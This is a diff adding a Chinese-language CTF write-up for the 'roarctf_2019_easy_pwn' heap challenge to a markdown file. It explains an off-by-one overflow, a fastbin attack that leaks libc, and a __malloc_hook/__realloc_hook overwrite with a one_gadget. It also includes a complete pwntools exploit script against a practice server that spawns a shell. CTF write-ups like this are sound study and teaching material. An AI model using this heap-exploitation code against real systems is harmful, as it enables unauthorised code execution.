@@ -1039,3 +1039,137 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### roarctf_2019_easy_pwn
+
+[题目链接]()
+
+这道题代码混淆有点恶心。
+
+`sub_E26` 这个函数很神秘，它判断两个值相减是否等于 10，如果是，就返回第一个值 +1。
+
++1 想到什么了呢，就是单字节溢出。
+
+往前看看，发现是 update 函数里调用了，第一个值就是我们的 size。
+
+所以单字节溢出，但是没有 manage_chunk，我们用 fastbins attack 得到 main_arena + 88 的地址，ret2libc。
+
+接着理论上该把 __malloc_hook 加入 Allocate 区，这里我本人用的 uaf，然后填入 one_gadget。
+
+但是我们发现 one_gadget 不能用，约束条件不达成。
+
+所以可以用 realloc，因为 realloc 在正式申请内存前有以下操作：
+
+<img width="482" height="305" alt="7a811d94bd78015e1ed2ca3121ad5b39" src="https://github.com/user-attachments/assets/1cd45799-a3d1-4b12-abb5-36ffd861afd0" />
+
+每一个 push 都会使得 `rsp -= 0x08`，这就可以控制 rsp 是否指向 NULL。
+
+我们也可以通过 `realloc + offset` 的形式，控制跳过几个 push，达到精确的控制。
+
+（由于环境问题，本地和靶机对不上，我枚举了）
+
+而 __realloc_hook 在 __malloc_hook 的 8 个字节之前，所以我们只要按顺序填上 one_gadget 和 realloc 就可以了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 28681
+io = remote(host,port)
+# io = process("./roarctf_2019_easy_pwn")
+elf = ELF("./roarctf_2019_easy_pwn")
+libc = ELF("./libc-2.23.so")
+heap_array = 0x202044
+
+def create(size):
+    io.recvuntil(b"choice: ")
+    io.sendline(b'1')
+    io.recvuntil(b"size: ")
+    io.sendline(str(size).encode())
+    index = io.recvline()
+    print("\nDEBUG [*] SUCCESS for create!",index)
+
+def write(index,size,content):
+    io.recvuntil(b"choice: ")
+    io.sendline(b'2')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"size: ")
+    io.sendline(str(size).encode())
+    io.recvuntil(b"content: ")
+    io.send(content)
+
+def drop(index):
+    io.recvuntil(b"choice: ")
+    io.sendline(b'3')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+
+def show(index):
+    io.recvuntil(b"choice: ")
+    io.sendline(b'4')
+    io.recvuntil(b"index: ")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"content: ")
+
+def main():
+    create(0x78)    # index 0
+    create(0x60)    # index 1
+    create(0x68)    # index 2
+    create(0x10)    # index 3
+    payload_0 = b'A'*0x78 + b'\xE1'
+    write(0,0x78 + 10,payload_0)
+    drop(1)
+    create(0x60)    # index 1 reborn
+    show(2)
+    leak_data = io.recvn(6).ljust(8,b'\x00')
+    main_arena_88 = u64(leak_data)
+    print("\n[+] Leak main_arena+88 address :",hex(main_arena_88))
+    malloc_hook = main_arena_88 - 0x68
+    print("\n[+] Leak __malloc_hook address :",hex(malloc_hook))
+    libc_base =  malloc_hook - libc.sym["__malloc_hook"]
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    realloc = libc_base + libc.sym["realloc"]
+    realloc_offset = 2 # -0x38  + 0x30 = -0x08 → NULL
+    print("\n[+] Leak realloc address :",hex(realloc))
+    one_gadget_offset = 0x4526a
+    one_gadget = libc_base + one_gadget_offset
+    print("\n[+] Leak one_gadget address :",hex(one_gadget))
+    create(0x68)    # index 4 for index 2 reborn
+    drop(2)
+    payload_1 = p64(malloc_hook - 0x23) * 2
+    write(4,len(payload_1),payload_1)
+    create(0x68)    # index 2 for index 2 reborn
+    create(0x68)    # index 5 Allocate __malloc_hook
+    payload_2 = b'B'*0xb + p64(one_gadget) + p64(realloc + realloc_offset) # 0x13 - 0x8 = 0xb
+    write(5,len(payload_2),payload_2)
+    io.recvuntil(b"choice: ")
+    io.sendline(b'1')
+    io.recvuntil(b"size: ")
+    # gdb.attach(io, "b realloc\nc")
+    io.sendline(b'16')
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+# 0x45216 execve("/bin/sh", rsp+0x30, environ)
+# constraints:
+#   rax == NULL
+
+# 0x4526a execve("/bin/sh", rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+```
+
